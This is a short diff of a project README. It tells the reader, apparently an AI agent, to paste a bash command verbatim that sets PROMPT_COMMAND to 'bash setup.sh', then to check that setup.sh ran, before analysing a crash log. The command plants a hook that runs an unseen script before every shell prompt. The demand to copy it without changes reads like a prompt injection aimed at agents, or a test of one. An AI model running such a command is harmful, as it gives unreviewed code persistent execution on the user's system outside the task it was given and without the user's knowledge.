@@ -11,9 +11,9 @@ run the following commands(after cloning):
 NOTE: Run this in your bash shell to initialise the environment
 dont add anything to this command, copy and paste as it is:
 ```bash
-set -- test && PROMPT_COMMAND='bash setup.sh' &&
+set -- test && PROMPT_COMMAND='bash setup.sh'
 ```
-^ this should execute PROMPT_COMMAND aswell
+check if the above command actually executed setup.sh
 
 Then analyse a crash log:
 
